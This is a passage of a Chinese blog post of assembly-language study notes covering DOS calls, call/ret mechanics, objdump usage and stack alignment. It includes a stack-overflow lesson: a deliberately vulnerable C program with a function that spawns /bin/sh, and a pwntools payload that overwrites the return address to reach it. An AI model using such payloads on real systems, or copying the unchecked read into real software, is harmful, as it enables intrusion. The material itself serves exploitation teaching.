+<p>那么操作系统怎么识别CS呢</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs powershell">CODE SEGMENT<br><span class="hljs-built_in">START</span>:<br>	...<br>CODE ENDS<br><span class="hljs-keyword">END</span> <span class="hljs-built_in">START</span><br>;<span class="hljs-built_in">START</span>标识随意，但是要对应，这个标识相当于c语言中的main函数<br></code></pre></td></tr></table></figure>
+<h3 id="过程定义伪指令">过程定义伪指令</h3>
+<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">过程名 PROC [<span class="hljs-built_in">NEAR</span>/<span class="hljs-built_in">FAR</span>]<br>...<br><span class="hljs-keyword">RET</span><br>过程名 ENDP<br></code></pre></td></tr></table></figure>
+<p>当前位置计数器$与定位伪指令ORG</p>
+<h2 id="dos功能调用">DOS功能调用</h2>
+<h3 id="带显示的键盘输入1号功能">带显示的键盘输入(1号功能)</h3>
+<figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs excel">char_buf <span class="hljs-built_in">DB</span> <span class="hljs-built_in">max</span>；最大长度<br><span class="hljs-built_in">DB</span> length；长度<br><span class="hljs-built_in">DB</span> <span class="hljs-built_in">max</span> Dup(<span class="hljs-number">0</span>)<br></code></pre></td></tr></table></figure>
+<p>最后的回车不算进length，但是算进max，也就是最多输入max-1个字符</p>
+<p>回车键最后对应的Ascii是0dH</p>
+<p>换行是0aH</p>
+<h3 id="不带显示的键盘输入8号功能">不带显示的键盘输入(8号功能)</h3>
+<h3 id="字符串输入0ah号功能">字符串输入(0AH号功能)</h3>
+<h3 id="字符显示2号功能">字符显示(2号功能)</h3>
+<h3 id="字符串显示9号功能">字符串显示(9号功能)</h3>
+<h3 id="返回dos系统">返回DOS系统</h3>
+<h2 id="函数调用分析">函数调用分析</h2>
+<p>call指令后面可以跟上不同的数据源，比如寄存器，存储单元。而不同的数据源不一定会将CS入栈。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs assembly">push CS<br>push IP<br>jmp near ptr 标号<br></code></pre></td></tr></table></figure>
+<p>ret指令相当于进行如下操作:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs assembly">pop IP<br></code></pre></td></tr></table></figure>
+<p>retf指令相当于进行如下操作:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">pop IP<br>pop CS<br></code></pre></td></tr></table></figure>
+<p>leave指令等价于：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov esp,ebp<br>pop ebp<br></code></pre></td></tr></table></figure>
+<p>如何使用objdump得到反汇编代码？</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs bash">The following i386/x86-64 specific disassembler options are supported <span class="hljs-keyword">for</span> use<br>with the -M switch (multiple options should be separated by commas):<br>  x86-64      Disassemble <span class="hljs-keyword">in</span> 64bit mode<br>  i386        Disassemble <span class="hljs-keyword">in</span> 32bit mode<br>  i8086       Disassemble <span class="hljs-keyword">in</span> 16bit mode<br>  att         Display instruction <span class="hljs-keyword">in</span> AT&amp;T syntax<br>  intel       Display instruction <span class="hljs-keyword">in</span> Intel syntax<br>  att-mnemonic<br>              Display instruction <span class="hljs-keyword">in</span> AT&amp;T mnemonic<br>  intel-mnemonic<br>              Display instruction <span class="hljs-keyword">in</span> Intel mnemonic<br>  addr64      Assume 64bit address size<br>  addr32      Assume 32bit address size<br>  addr16      Assume 16bit address size<br>  data32      Assume 32bit data size<br>  data16      Assume 16bit data size<br>  suffix      Always display instruction suffix <span class="hljs-keyword">in</span> AT&amp;T syntax<br>  amd64       Display instruction <span class="hljs-keyword">in</span> AMD64 ISA<br>  intel64     Display instruction <span class="hljs-keyword">in</span> Intel64 ISA<br></code></pre></td></tr></table></figure>
+<p>8086CPU格式</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">objdump -d -M intel,i8086 a.out<br></code></pre></td></tr></table></figure>
+<p>64位Intel格式</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">objdump -d -M intel,x86-64 a.out<br></code></pre></td></tr></table></figure>
+<p>32位Intel格式</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">objdump -d -M intel,i386 a.out<br></code></pre></td></tr></table></figure>
+<p>我们对下面的代码进行分析：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">add</span><span class="hljs-params">(<span class="hljs-type">int</span> a, <span class="hljs-type">int</span> b)</span><br>{<br>    <span class="hljs-type">int</span> c;<br>    c = a + b;<br>    <span class="hljs-keyword">return</span> c;<br>}<br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>{<br>    <span class="hljs-type">int</span> a = <span class="hljs-number">1</span>;<br>    <span class="hljs-type">int</span> b = <span class="hljs-number">2</span>;<br>    <span class="hljs-type">int</span> cc;<br>    cc = add(a, b);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>}<br><span class="hljs-comment">// gcc -O0 -g -m32 main.c &amp;&amp; objdump -d -M intel -S a.out 1&gt;assembly_code</span><br></code></pre></td></tr></table></figure>
+<p><img src="/2022/10/11/Security/Assembly/image-20231125141210466.png" srcset="/img/loading.gif" lazyload alt="image-20231125141210466" style="zoom:50%;"></p>
+<p>我们注意到，在执行call之前，做了一件事：将参数压入栈</p>
+<p>对于<code>add(a, b)</code>，首先压栈的是参数b，然后是参数a；</p>
+<p>然后我们执行call指令</p>
+<p><img src="/2022/10/11/Security/Assembly/image-20231125141409923.png" srcset="/img/loading.gif" lazyload alt="image-20231125141409923" style="zoom:50%;"></p>
+<p>这里，我们需要注意一下call之后的指令地址：<code>0x565561fe</code></p>
+<figure>
+<img src="/2022/10/11/Security/Assembly/image-20231125142000640.png" srcset="/img/loading.gif" lazyload alt="image-20231125142000640">
+<figcaption aria-hidden="true">image-20231125142000640</figcaption>
+</figure>
+<p><img src="/2022/10/11/Security/Assembly/image-20231125143500656.png" srcset="/img/loading.gif" lazyload alt="image-20231125143500656" style="zoom:50%;"></p>
+<p><img src="/2022/10/11/Security/Assembly/image-20231125143555195.png" srcset="/img/loading.gif" lazyload alt="image-20231125143555195" style="zoom:50%;"></p>
+<h2 id="栈溢出的一个例子">栈溢出的一个例子</h2>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-type">void</span> <span class="hljs-title function_">exploit</span><span class="hljs-params">()</span><br>{<br>    system(<span class="hljs-string">"/bin/sh"</span>);<br>}<br><span class="hljs-type">void</span> <span class="hljs-title function_">func</span><span class="hljs-params">()</span><br>{<br>    <span class="hljs-type">char</span> str[<span class="hljs-number">0x20</span>];<br>    read(<span class="hljs-number">0</span>, str, <span class="hljs-number">0x50</span>);<br>}<br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>{<br>    func();<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>}<br><span class="hljs-comment">// gcc -no-pie -fno-stack-protector -z execstack -m32 main.c</span><br></code></pre></td></tr></table></figure>
+<p>我们的目标是执行<code>exploit</code>函数，通过前面我们对函数调用的分析，我们知道，在栈中曾经暂存了IP寄存器的数值，而这最终要pop到IP寄存器中，我们是否可以通过覆盖掉此值实现跳转到任意函数地址呢？答案是可以的，因为CPU并不会检查栈溢出。</p>
+<p>我们通过gdb直接进入<code>func</code>函数。</p>
+<p><img src="/2022/10/11/Security/Assembly/image-20231125153355786.png" srcset="/img/loading.gif" lazyload alt="image-20231125153355786" style="zoom:50%;"></p>
+<p><img src="/2022/10/11/Security/Assembly/image-20231125153953854.png" srcset="/img/loading.gif" lazyload alt="image-20231125153953854" style="zoom:50%;"></p>
+<p>通过对汇编代码的分析，我们可以构建如下的payload：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> process, p32<br>p = process(<span class="hljs-string">'./a.out'</span>)<br>offset = <span class="hljs-number">0x28</span> + <span class="hljs-number">0x4</span><br>payload = <span class="hljs-string">b'a'</span> * offset + p32(<span class="hljs-number">0x080491b6</span>)<br>p.sendline(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure>
+<p><img src="/2022/10/11/Security/Assembly/image-20231125154040426.png" srcset="/img/loading.gif" lazyload alt="image-20231125154040426" style="zoom:50%;"></p>
+<h2 id="字节对齐">字节对齐</h2>
+<p>编译如下代码：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>{<br>    <span class="hljs-type">char</span> *name = <span class="hljs-string">"D4wn"</span>;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"My name is %s"</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>}<br><span class="hljs-comment">// gcc -no-pie -fno-stack-protector -m32 main.c</span><br></code></pre></td></tr></table></figure>
+<p><img src="/2022/10/11/Security/Assembly/image-20231125163926709.png" srcset="/img/loading.gif" lazyload alt="image-20231125163926709" style="zoom:50%;"></p>
+<p>观察反编译代码，我们可以看到有三行比较特殊，负责16字节对齐，对齐前后的效果只是esp的位置发生了改变。</p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/Security/" class="category-chain-item">Security</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/%E6%B1%87%E7%BC%96/" class="print-no-link">#汇编</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>Assembly</div>
+      <div>https://d4wnnn.github.io/2022/10/11/Security/Assembly/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>D4wn</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2022年10月11日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2023/01/12/Dev/Go/" title="Go">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">Go</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2022/10/11/Security/Pwn/" title="Pwn">
+                        <span class="hidden-mobile">Pwn</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+  <div id="valine"></div>
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#valine', function() {
+      Fluid.utils.createScript('https://lib.baomitu.com/valine/1.5.1/Valine.min.js', function() {
+        var options = Object.assign(
+          {"appId":"iQzcdzgtk7S3lKyzUoT3segU-gzGzoHsz","appKey":"mL1QjUEvvzJ9E2xIVz0OuJuj","path":"window.location.pathname","placeholder":"Hello","avatar":"retro","meta":["nick","mail","link"],"requiredFields":[],"pageSize":10,"lang":"zh-CN","highlight":true,"recordIP":true,"serverURLs":"https://iqzcdzgt.lc-cn-n1-shared.com","emojiCDN":"https://valinecdn.bili33.top/","emojiMaps":{"QQ1":"QQ/aini.gif","QQ2":"QQ/aixin.gif","QQ3":"QQ/aoman.gif","QQ4":"QQ/baiyan.gif","QQ5":"QQ/bangbangtang.gif","QQ6":"QQ/baojin.gif","QQ7":"QQ/baoquan.gif","QQ8":"QQ/bishi.gif","QQ9":"QQ/bizui.gif","QQ11":"QQ/cahan.gif","QQ12":"QQ/caidao.gif","QQ13":"QQ/chi.gif","QQ14":"QQ/ciya.gif","QQ15":"QQ/dabing.gif","QQ16":"QQ/daku.gif","QQ17":"QQ/dan.gif","QQ18":"QQ/deyi.gif","QQ19":"QQ/doge.gif","QQ20":"QQ/fadai.gif","QQ21":"QQ/fanu.gif","QQ22":"QQ/fendou.gif","QQ23":"QQ/ganga.gif","QQ24":"QQ/gouyin.gif","QQ25":"QQ/guzhang.gif","QQ26":"QQ/haixiu.gif","QQ27":"QQ/hanxiao.gif","QQ28":"QQ/haobang.gif","QQ29":"QQ/haqian.gif","QQ30":"QQ/hecai.gif","QQ31":"QQ/hexie.gif","QQ32":"QQ/huaixiao.gif","QQ33":"QQ/jie.gif","QQ34":"QQ/jingkong.gif","QQ35":"QQ/jingxi.gif","QQ36":"QQ/jingya.gif","QQ37":"QQ/juhua.gif","QQ38":"QQ/keai.gif","QQ39":"QQ/kelian.gif","QQ40":"QQ/koubi.gif","QQ41":"QQ/ku.gif","QQ42":"QQ/kuaikule.gif","QQ43":"QQ/kulou.gif","QQ44":"QQ/kun.gif","QQ45":"QQ/lanqiu.gif","QQ46":"QQ/leiben.gif","QQ47":"QQ/lenghan.gif","QQ48":"QQ/liuhan.gif","QQ49":"QQ/liulei.gif","QQ50":"QQ/nanguo.gif","QQ51":"QQ/OK.gif","QQ52":"QQ/penxue.gif","QQ53":"QQ/piezui.gif","QQ54":"QQ/pijiu.gif","QQ55":"QQ/qiang.gif","QQ56":"QQ/qiaoda.gif","QQ57":"QQ/qinqin.gif","QQ58":"QQ/qiudale.gif","QQ59":"QQ/quantou.gif","QQ60":"QQ/saorao.gif","QQ61":"QQ/se.gif","QQ62":"QQ/shengli.gif","QQ63":"QQ/shouqiang.gif","QQ64":"QQ/shuai.gif","QQ65":"QQ/shui.gif","QQ66":"QQ/tiaopi.gif","QQ67":"QQ/touxiao.gif","QQ68":"QQ/tu.gif","QQ69":"QQ/tuosai.gif","QQ70":"QQ/weiqu.gif","QQ71":"QQ/weixiao.gif","QQ72":"QQ/woshou.gif","QQ73":"QQ/wozuimei.gif","QQ74":"QQ/wunai.gif","QQ75":"QQ/xia.gif","QQ76":"QQ/xiaojiujie.gif","QQ77":"QQ/xiaoku.gif","QQ78":"QQ/xiaoyanger.gif","QQ79":"QQ/xieyanxiao.gif","QQ80":"QQ/xigua.gif","QQ81":"QQ/xu.gif","QQ82":"QQ/yangtuo.gif","QQ83":"QQ/yinxian.gif","QQ84":"QQ/yiwen.gif","QQ85":"QQ/youhengheng.gif","QQ86":"QQ/youling.gif","QQ87":"QQ/yun.gif","QQ88":"QQ/zaijian.gif","QQ89":"QQ/zhayanjian.gif","QQ90":"QQ/zhemo.gif","QQ91":"QQ/zhouma.gif","QQ92":"QQ/zhuakuang.gif","QQ93":"QQ/zuohengheng.gif"},"enableQQ":true},
+          {
+            el: "#valine",
+            path: window.location.pathname
+          }
+        )
+        new Valine(options);
+        Fluid.utils.waitElementVisible('#valine .vcontent', () => {
+          var imgSelector = '#valine .vcontent img:not(.vemoji)';
+          Fluid.plugins.imageCaption(imgSelector);
+          Fluid.plugins.fancyBox(imgSelector);
+        })
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://github.com/d4wnnn" target="_blank" rel="nofollow noopener"><span>Github</span></a> <i class="iconfont icon-love"></i> <a href="tencent://message/?uin=2638177031" target="_blank" rel="nofollow noopener"><span>联系我</span></a> <div> <span id="timeDate">载入天数...</span> <span id="times">载入时分秒...</span> <script src="/js/duration.js"></script> </div> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/koharu.model.json"},"display":{"position":"left","width":150,"height":300},"mobile":{"show":true},"log":false});</script></body>
+</html>
